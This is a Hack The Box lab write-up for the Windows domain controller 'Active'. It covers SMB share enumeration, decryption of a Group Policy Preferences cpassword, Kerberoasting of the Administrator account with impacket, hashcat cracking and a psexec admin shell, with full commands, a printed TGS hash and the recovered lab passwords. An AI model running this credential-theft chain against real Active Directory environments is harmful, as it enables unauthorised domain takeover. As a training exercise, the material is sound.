---
title: "Hack The Box - Active"
date: 2020-01-24
tags: [oscp, htb, windows]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Active Directory Kerboroasting"
picture: /assets/htb-active/machine_info.png
author_profile: false
---

![](/assets/htb-active/machine_info.png)

## Enumeration

Nmap scans show a fairly robust port map. The presence of DNS,Kerberos, and LDAP point to this being a Windows Domain Controller.

```
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.047s latency).
Scanned at 2020-01-24 10:19:31 EST for 174s
Not shown: 65512 closed ports
Reason: 65512 resets
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-01-24 15:21:37Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49182/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

The `enum4linux` scan shows that the domain name appears to be `active.htb`, and that this is in fact a DC.

```
 ===================================== 
|    Session Check on 10.10.10.100    |
 ===================================== 
[+] Server 10.10.10.100 allows sessions using username '', password ''
[+] Got domain/workgroup name: ACTIVE

 ===================================================== 
|    Getting information via LDAP for 10.10.10.100    |
 ===================================================== 
[+] Long domain name for 10.10.10.100: active.htb
[+] 10.10.10.100 appears to be a root/parent DC
```

Now that we know we're dealing with a domain, we should set our machines `/etc/hosts` file to point 10.10.10.100 to `active.htb`, which will make further enumeration easier.

Now that we know what we're targeting, there are a few things we can enumerate. First, we can easily brute-force a list of possible usernames from Kerberos, using the `kerbrute` tool. Second, we can look for possible sub-domains, and attempt a DNS Zone Transfer on the DNS server.

Running a scan of the domain with `fierce` resulted in no DNS Zone Transfer, or bruteforced subdomains.

```shell
root@kali:/htb/10.10.10.100/smb# fierce -dns active.htb -wordlist /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt 

Trying zone transfer first...

Unsuccessful in zone transfer (it was worth a shot)
Okay, trying the good old fashioned way... brute force

Checking for wildcard DNS...
Nope. Good.
Now performing 2280 test(s)...

Subnets found (may want to probe here using nmap or unicornscan):

Done with Fierce scan: http://ha.ckers.org/fierce/
Found 0 entries.

Have a nice day.
```

The tool [`kerbrute`](https://github.com/ropnop/kerbrute) can be used to bruteforce user passwords or names, or password spray using Kerberos. When we run `kerbrute` against a username list with about 650k usernames, we only get a return for `administrator`/`Administrator`.

```shell
root@kali:/htb/10.10.10.100# kerbrute userenum --dc 10.10.10.100 -d active.htb -t 200 /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/24/20 - Ronnie Flathers @ropnop

2020/01/24 11:06:14 >  Using KDC(s):
2020/01/24 11:06:14 >   10.10.10.100:88

2020/01/24 11:06:14 >  [+] VALID USERNAME:       administrator@active.htb
2020/01/24 11:06:19 >  [+] VALID USERNAME:       Administrator@active.htb
2020/01/24 11:10:53 >  Done! Tested 624370 usernames (2 valid) in 279.612 seconds
```

So neither of these methods gave us much. However, when we dig into the `enum4linux` scan results further, we can see several SMB shares that are available to us.

```
 ========================================= 
|    Share Enumeration on 10.10.10.100    |
 ========================================= 
Domain=[ACTIVE] OS=[] Server=[]
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
//10.10.10.100/ADMIN$	Mapping: DENIED, Listing: N/A
//10.10.10.100/C$	Mapping: DENIED, Listing: N/A
//10.10.10.100/IPC$	Mapping: OK	Listing: DENIED
//10.10.10.100/NETLOGON	Mapping: DENIED, Listing: N/A
//10.10.10.100/Replication	Mapping: OK, Listing: OK
//10.10.10.100/SYSVOL	Mapping: DENIED, Listing: N/A
//10.10.10.100/Users	Mapping: DENIED, Listing: N/A
```

It seems that the `/Replication` share is available to us. Let's check what our `autorecon` script gave us for a content listing:

```
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.100...
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	.                                                  
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	active.htb
	Replication                                       	READ ONLY	
	.\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	active.htb
	.\active.htb\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	scripts
	.\active.htb\DfsrPrivate\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Installing
	.\active.htb\Policies\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--               23 Sat Jul 21 06:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
	.\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--              119 Sat Jul 21 06:38:11 2018	GPE.INI
	.\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Preferences
	-r--r--r--             2788 Sat Jul 21 06:38:11 2018	Registry.pol
	.\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Windows NT
	.\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	SecEdit
	.\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--             1098 Sat Jul 21 06:38:11 2018	GptTmpl.inf
	.\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Groups
	.\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--              533 Sat Jul 21 06:38:11 2018	Groups.xml
	.\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--               22 Sat Jul 21 06:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
	.\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Microsoft
	.\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Windows NT
	.\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	SecEdit
	.\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--             3722 Sat Jul 21 06:38:11 2018	GptTmpl.inf
```

---

## Groups.xml

Looks like we have `Groups.xml` in `\\10.10.10.100\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\`. This file is a gold-mine for credentials when working against older Active Directory, as it contains user data, including an encrypted password. Let's grab the file with a SMB session we can start with `smbclient \\\\10.10.10.100\\Replication`. We'll have to drill down to that path, and use `get Groups.xml` to download it locally.

Now we can open it up and see the contents:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

So we have a domain user called `SVC_TGS`, and the encrypted `cpassword` field. Kali includes a tool to decrypt these credentials on the fly, which we can use with `gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

```shell
root@kali:/htb/10.10.10.100/smb# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```

So we now have a password for `active.htb/SVC_TGS` of `GPPstillStandingStrong2k18`! Now we can do some more enumeration with this account.

## Enumerate with `nullinux`

We can use the [`nullinux`](https://github.com/m8r0wn/nullinux) tool to further enumerate via SMB, now that we have proper credentials. The command `nullinux -U 'active.htb\svc_tgs' -P 'GPPstillStandingStrong2k18' 10.10.10.100` will run the tool with our new credentials. Below is the output.

```shell
root@kali:/htb/10.10.10.100# nullinux -U 'active.htb\svc_tgs' -P 'GPPstillStandingStrong2k18' 10.10.10.100

    Starting nullinux v5.4.1 | 01-24-2020 13:49


[+] 10.10.10.100: Domain=[ACTIVE] OS=[] Server=[]

[*] Enumerating Shares for: 10.10.10.100
        Shares                     Comments
   -------------------------------------------
    \\10.10.10.100\ADMIN$          Remote Admin
    \\10.10.10.100\C$              Default share
    \\10.10.10.100\IPC$
    \\10.10.10.100\NETLOGON        Logon server share
    \\10.10.10.100\Replication     
    \\10.10.10.100\SYSVOL          Logon server share
    \\10.10.10.100\Users           

   [*] Enumerating: \\10.10.10.100\NETLOGON
       .                                   D        0  Wed Jul 18 14:48:57 2018
       ..                                  D        0  Wed Jul 18 14:48:57 2018

   [*] Enumerating: \\10.10.10.100\Replication
       .                                   D        0  Sat Jul 21 06:37:44 2018
       ..                                  D        0  Sat Jul 21 06:37:44 2018
       active.htb                          D        0  Sat Jul 21 06:37:44 2018

   [*] Enumerating: \\10.10.10.100\SYSVOL
       .                                   D        0  Wed Jul 18 14:48:57 2018
       ..                                  D        0  Wed Jul 18 14:48:57 2018
       active.htb                          D        0  Wed Jul 18 14:48:57 2018

   [*] Enumerating: \\10.10.10.100\Users
       .                                  DR        0  Sat Jul 21 10:39:20 2018
       ..                                 DR        0  Sat Jul 21 10:39:20 2018
       Administrator                       D        0  Mon Jul 16 06:14:21 2018
       All Users                         DHS        0  Tue Jul 14 01:06:44 2009
       Default                           DHR        0  Tue Jul 14 02:38:21 2009
       Default User                      DHS        0  Tue Jul 14 01:06:44 2009
       desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
       Public                             DR        0  Tue Jul 14 00:57:55 2009
       SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

[*] Enumerating Domain Information for: 10.10.10.100
[+] Domain Name: ACTIVE
[+] Domain SID: S-1-5-21-405608879-3187717380-1996298813

[*] Enumerating querydispinfo for: 10.10.10.100
    Administrator
    Guest
    krbtgt
    SVC_TGS

[*] Enumerating enumdomusers for: 10.10.10.100
    Administrator
    Guest
    krbtgt
    SVC_TGS

[*] Enumerating LSA for: 10.10.10.100

[*] Performing RID Cycling for: 10.10.10.100
    Administrator
    krbtgt
    Guest
    Domain Users                        (Network/LocalGroup)
    Domain Guests                       (Network/LocalGroup)
    Domain Admins                       (Network/LocalGroup)
    Domain Computers                    (Network/LocalGroup)
    Domain Controllers                  (Network/LocalGroup)
    Cert Publishers                     (Network/LocalGroup)
    Enterprise Admins                   (Network/LocalGroup)
    Group Policy Creator Owners         (Network/LocalGroup)
    Read-only Domain Controllers        (Network/LocalGroup)
    Schema Admins                       (Network/LocalGroup)

[*] Testing 10.10.10.100 for Known Users
    Administrator
    Guest
    krbtgt

[*] Enumerating Group Memberships for: 10.10.10.100
[+] Group: Enterprise Read-only Domain Controllers
[+] Group: Domain Admins
    Administrator
[+] Group: Domain Users
    Administrator
    krbtgt
    SVC_TGS
[+] Group: Domain Guests
    Guest
[+] Group: Domain Computers
[+] Group: Domain Controllers
    DC$
[+] Group: Schema Admins
    Administrator
[+] Group: Enterprise Admins
    Administrator
[+] Group: Group Policy Creator Owners
    Administrator
[+] Group: Read-only Domain Controllers
[+] Group: DnsUpdateProxy

[*] 5 unique user(s) identified
[+] Writing users to file: ./nullinux_users.txt
```

It looks like the only real accounts on this box are `SVC_TGS` and `Administrator`.

## Try for PSEXEC

A common method of gaining a shell on Windows targets running SMB shares is to use PSExec, which is included as part of the [`impacket` kit](https://github.com/SecureAuthCorp/impacket). It provides a PowerShell shell, which we can use if the current user has any writable shares.

To test, we can run `impacket-psexec active.htb/svc_tgs@10.10.10.100`

```shell
root@kali:/htb/10.10.10.100# impacket-psexec active.htb/svc_tgs@10.10.10.100
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.
```

Unfortunately, since none of the shares are writable as `svc_tgs`, we can't get a remote shell as this user.

## Grabbing `user.txt`

Although we don't have a shell, we now have read access to the `Users` share, which allows us to grab the `user.txt` file out of `//10.10.10.100/Users/svc_tgs/Desktop/user.txt`. You can use `smbclient -U active.htb/svc_tgs //10.10.10.100/Users` to start a session as the user.

## Kerboroasting Administrator account

Since we have no remote shell, we need to see what other paths are still open to us. We can still use Kerberos to try to see if we can grab the Administrators SPN hash, which we can then crack with `hashcat`, and login. This attack is called Kerboraosting.

To grab the hash, we'll be using the `GetUserSPNs` script from `impacket`. The command `impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs` will output the hash for us.

```shell
root@kali:/htb/10.10.10.100# impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                  
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$2440d87a996a2f20731f0f3071fbfc61$45cafbfe19cd5196608b59194d627d044acb54d4163d4593f58065931c504a82789da9cba387bf7503e2d4432d2cd43835bafcea4537497c3980e3a09084a9bef9cca7a01d3798e641c14d7729d5a2bfef67a8a53f4ad7d009a49236d0e736d235cc3b1bee9450a6a79dece9c6ac4957b9184319f923ec4c75a19878c6ff49310f5ff5d1d3f674543f043871fe16513ad52986d4545c4de6aba136c36321b8b05fc5a5e38711811c10166a31fdd842d619b6fdf547cfd1387dc3f49c827508b68ec7c40c21f879b846687615f591721e878be0188edc132bb8050fd6dc202b6a22e820182e2fa064a6fa4547586a48b004972b0b93ca6d817e3228febb9e9f8a81a581e2aed158a64bfa3beb96e5527fb692cdf929cf71a2dc9d48c91ae2b2b6ac945b0092bd0717a5108105176733e0493a4647020a487da79d256bdcc232298e6feafce2fe4e175c2fdf45877b64abb1b3243d27e5aa34258cbab369d8033e9b3d1185cf89af026c74db58d1d291c3e74aee780b78113100646670ce0807c5a0358b55c41c934de150961c52cf0f4860af7e2b61713d1378b17b0da6bb7105a81c42816fc0a8ef2dc107d856126eb89175d4a421419de28dbd8892119de6e4981f932ae22ffbee1ca5eabc3369122fbdfe42beafdb401162416e8fdfdcae0ae053398dbbc113f40839a00428d8e3d5c27344d562e3d639187c9c2ebc73d8ccae7e192fefea977b6105d98a28750cd01ee7795a044506423c163610f633bd8d023edf3ea99cfbb64e35536cc8fdc5eb9b9b61ef61d86e523d7a0a4a93f7a69a19f75c84bde586820703b9346e08d6ee82d7e79a2e9e36fd87e4b662c63d39bc259f091bcab2efc8060366e5416fe5e540f6eaf5778bfd71e5305d0ac6071107ede3e858970c2f6c22cd84848aee1ce4379d376ee3296ef5657a19534f0e80dcc27798294ad86943f5f38a64e68a0022cc00c624a8adee7d27de33f41c5bba8a0573366b6bd6a83519c065af8416aa885fb3c13751cb9700a11ae1dacd231508416dad851a2acd6d96f1e5b23d9b4425860ce340df37b260fdb697839851c1a1ef1040d613ec1d180bf9b942af22a8274c5e30c3b0349b3fb75ebcf9cce2d9bf6708f0ba321f1c570cfda789a8fb6e4fa4671bbbfa375bc9773bc0e5ef5b11452017704ca062b5d2836502da59fd774d6a7a74d01fc75d47ddc8a08f85303f2c0251ede1d74391a177417a01ccc51197cb154985d362acbd7543
```

There we have it! Now we just need to save the hash (the entire thing!) to a local file so we can feed it to `hashcat`.

## Cracking Administrator TGS hash

We can now feed this into `hashcat` using the command `hashcat -m 13100 loot/admin_tgs_hash /usr/share/wordlists/rockyou.txt --force`.

A quick refresher on `hashcat` options:
- `-m 13100` sets the mode. You can go to [this link](https://hashcat.net/wiki/doku.php?id=hashcat) and look up `tgs 23`, and find the mode needed for the hash.
- `loot/admin_tgs_hash` is the file we saved the hash to in our `loot` directory locally.
- `/usr/share/wordlists/rockyou.txt` is the infamous RockYou wordlist.
- `--force` is needed since we're running this from a VM, and don't have a proper GPU/CPU configured as a device.

Within a minute, we get our results:

<a href="/assets/htb-active/admin_tgs_hash_cracked.png"><img src="/assets/htb-active/admin_tgs_hash_cracked.png" width="95%"></a>

The password for `Administrator` is `Ticketmaster1968`. Time to login with PSEXEC and grab root.

## Grabbing `root.txt`

The command `impacket-psexec active.htb/administrator@10.10.10.100` will open up our admin shell

![](/assets/htb-active/admin_shell.png)

We can grab the flag from `C:\Users\Administrator\Desktop\root.txt`

![](/assets/htb-active/root_proof.png)

